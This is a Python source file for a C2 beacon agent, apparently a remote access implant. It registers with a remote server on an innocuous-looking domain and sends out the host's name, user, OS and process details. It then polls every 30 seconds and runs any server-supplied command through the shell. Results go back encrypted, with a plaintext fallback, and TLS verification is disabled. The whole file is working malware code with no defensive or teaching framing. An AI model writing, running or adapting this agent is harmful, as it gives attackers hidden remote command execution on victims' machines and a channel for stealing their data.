#!/usr/bin/env python3
import requests
import json
import platform
import os
import uuid
import time
import base64
import subprocess
import random
from cryptography.fernet import Fernet, InvalidToken

# ============================================
# CONFIGURATION - NO PROXY
# ============================================
C2_URL = "https://assets-delivery.org"
AGENT_ID = f"agent-{str(uuid.uuid4())[:8]}"

# ============================================
# MASTER KEY
# ============================================
MASTER_KEY_B64 = "WENqbU9XTVNURzJ2TGtNODNVbTNfYkhmeDZDN1ZBUUxUalpnVVdwWEl3ND0="
MASTER_KEY_B64 = MASTER_KEY_B64.strip()

try:
    MASTER_KEY = base64.b64decode(MASTER_KEY_B64)
    master_cipher = Fernet(MASTER_KEY)
    print("[✓] Master key is valid")
except Exception as e:
    print(f"[!] Invalid master key: {e}")
    raise

agent_cipher = None
encryption_key = None

# Disable SSL warnings for self-signed certs
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

# ============================================
# HELPER FUNCTIONS
# ============================================
def safe_get_login():
    try:
        return os.getlogin()
    except OSError:
        try:
            import pwd
            return pwd.getpwuid(os.getuid()).pw_name
        except:
            return "unknown"

def get_system_info():
    return {
        "hostname": platform.node(),
        "username": safe_get_login(),
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "process_id": os.getpid()
    }

def run_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        return output if output else "[Command executed with no output]"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 30 seconds"
    except Exception as e:
        return f"[!] Error: {str(e)}"

def get_sysinfo():
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "processor": platform.processor(),
        "username": safe_get_login(),
        "python_version": platform.python_version()
    }
    return json.dumps(info, indent=2)

# ============================================
# ENCRYPTION FUNCTIONS
# ============================================
def encrypt_with_master(data):
    try:
        encrypted = master_cipher.encrypt(json.dumps(data).encode())
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        print(f"[!] Master encryption error: {e}")
        return None

def decrypt_with_master(encrypted_data):
    try:
        decrypted = master_cipher.decrypt(base64.b64decode(encrypted_data))
        return json.loads(decrypted.decode())
    except Exception as e:
        print(f"[!] Master decryption error: {e}")
        return None

def encrypt_with_agent_key(data):
    if not agent_cipher:
        return json.dumps(data)
    try:
        encrypted = agent_cipher.encrypt(json.dumps(data).encode())
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        print(f"[!] Agent encryption error: {e}")
        return json.dumps(data)

def decrypt_with_agent_key(encrypted_data):
    if not agent_cipher:
        return encrypted_data
    try:
        decrypted = agent_cipher.decrypt(base64.b64decode(encrypted_data))
        return json.loads(decrypted.decode())
    except InvalidToken:
        print("[!] Invalid token - key mismatch")
        return None
    except Exception as e:
        print(f"[!] Agent decryption error: {e}")
        return None

# ============================================
# AGENT FUNCTIONS
# ============================================
def register_agent():
    global agent_cipher, encryption_key

    payload = {
        "agent_id": AGENT_ID,
        **get_system_info()
    }

    print(f"[*] Registering agent {AGENT_ID}...")

    try:
        print(f"[DEBUG] Connecting to: {C2_URL}/api/v1/register")

        resp = requests.post(
            f"{C2_URL}/api/v1/register",
            json=payload,
            timeout=(10, 30),
            verify=False
        )
        resp.raise_for_status()
        data = resp.json()
        print(f"[DEBUG] Registration response received")

        if data.get("encrypted"):
            print("[DEBUG] Response is encrypted, decrypting with master key...")
            decrypted_data = decrypt_with_master(data["payload"])
            if not decrypted_data:
                print("[!] Failed to decrypt registration response")
                return None

            print("[✓] Registration successful!")
            print(f"    Agent ID: {decrypted_data['agent_id']}")
            print(f"    Sleep interval: {decrypted_data['sleep']}")

            encryption_key = decrypted_data["encryption_key"]
            agent_key_bytes = base64.b64decode(encryption_key)
            agent_cipher = Fernet(agent_key_bytes)
            print("[DEBUG] Agent cipher initialized successfully")

            return encryption_key
        else:
            print("[!] Warning: Received unencrypted response")
            encryption_key = data["encryption_key"]
            agent_key_bytes = base64.b64decode(encryption_key)
            agent_cipher = Fernet(agent_key_bytes)
            return encryption_key

    except requests.exceptions.ConnectTimeout:
        print("[!] Registration error: Connection timeout - C2 may be unreachable")
        return None
    except requests.exceptions.ReadTimeout:
        print("[!] Registration error: Read timeout - C2 not responding")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Registration error: Connection failed - {e}")
        return None
    except Exception as e:
        print(f"[!] Registration error: {type(e).__name__}: {e}")
        return None

def beacon(agent_key_str):
    global agent_cipher

    if not agent_cipher and agent_key_str:
        agent_key_bytes = base64.b64decode(agent_key_str)
        agent_cipher = Fernet(agent_key_bytes)

    beacon_data = {
        "agent_id": AGENT_ID,
        "hostname": platform.node(),
        "username": safe_get_login(),
        "os": platform.system(),
        "arch": platform.machine(),
        "process_id": os.getpid()
    }

    payload = encrypt_with_agent_key(beacon_data)

    try:
        resp = requests.post(
            f"{C2_URL}/api/v1/beacon",
            json={
                "encrypted": True,
                "agent_id": AGENT_ID,
                "payload": payload
            },
            headers={"Authorization": "Bearer agent-secret-key-2024"},
            timeout=(10, 30),
            verify=False
        )

        if resp.status_code == 200:
            data = resp.json()

            if data.get("encrypted"):
                task_data = decrypt_with_agent_key(data["payload"])
                if not task_data:
                    return
            else:
                task_data = data

            tasks = task_data.get("tasks", [])
            if tasks:
                print(f"\n[+] Received {len(tasks)} task(s)")

            for task in tasks:
                task_id = task.get("task_id")
                command = task.get("command")
                args = task.get("args", [])

                print(f"\n[+] Executing task {task_id}: {command} {args}")

                if command == "sysinfo":
                    result = get_sysinfo()
                    exit_code = 0
                elif command == "whoami":
                    result = run_command("whoami")
                    exit_code = 0
                elif command == "pwd":
                    result = run_command("pwd")
                    exit_code = 0
                elif command == "ls":
                    cmd = "ls -la" if args and "-la" in args else "ls"
                    result = run_command(cmd)
                    exit_code = 0
                elif command == "shell" and args:
                    result = run_command(" ".join(args))
                    exit_code = 0
                else:
                    result = run_command(command)
                    exit_code = 0

                result_data = {
                    "agent_id": AGENT_ID,
                    "task_id": task_id,
                    "output": result[:1000000],
                    "exit_code": exit_code,
                    "error": ""
                }

                result_payload = encrypt_with_agent_key(result_data)

                try:
                    result_resp = requests.post(
                        f"{C2_URL}/api/v1/result",
                        json={
                            "encrypted": True,
                            "agent_id": AGENT_ID,
                            "payload": result_payload
                        },
                        headers={"Authorization": "Bearer agent-secret-key-2024"},
                        timeout=(10, 30),
                        verify=False
                    )

                    if result_resp.status_code == 200:
                        print(f"[✓] Result sent for task {task_id}")
                    else:
                        print(f"[!] Encrypted result failed: HTTP {result_resp.status_code}")

                        print("[*] Trying simple result endpoint...")
                        simple_resp = requests.post(
                            f"{C2_URL}/api/v1/simple_result",
                            params={
                                "agent_id": AGENT_ID,
                                "task_id": task_id,
                                "output": result[:1000000],
                                "exit_code": exit_code
                            },
                            headers={"Authorization": "Bearer agent-secret-key-2024"},
                            timeout=(10, 30),
                            verify=False
                        )

                        if simple_resp.status_code == 200:
                            print(f"[✓] Result sent via simple endpoint")
                        else:
                            print(f"[!] Simple result failed: {simple_resp.status_code}")

                except Exception as e:
                    print(f"[!] Error sending result: {e}")

            next_beacon = task_data.get("next_beacon", 30)
            print(f"[*] Next beacon in {next_beacon}s", end="\r")

    except requests.exceptions.ConnectTimeout:
        print(f"[!] Beacon error: Connection timeout - C2 unreachable")
    except requests.exceptions.ReadTimeout:
        print(f"[!] Beacon error: Read timeout - C2 not responding")
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def main():
    print("""
    ╔══════════════════════════════════╗
    ║     C2 Agent - InternalC2Server  ║
    ╚══════════════════════════════════╝
    """)

    print(f"[*] Target C2: {C2_URL}")
    print(f"[*] Agent ID: {AGENT_ID}")
    print(f"[*] Using HTTPS with self-signed cert (verify=False)")

    agent_key = register_agent()
    if not agent_key:
        print("[!] Registration failed. Exiting.")
        return

    print(f"[*] Agent encryption key: {agent_key[:20]}...")
    print(f"[*] Starting beacon loop...\n")

    while True:
        try:
            beacon(agent_key)
        except KeyboardInterrupt:
            print("\n[*] Agent stopped by user")
            break
        except Exception as e:
            print(f"[!] Main loop error: {e}")

        time.sleep(30)

if __name__ == "__main__":
    main()
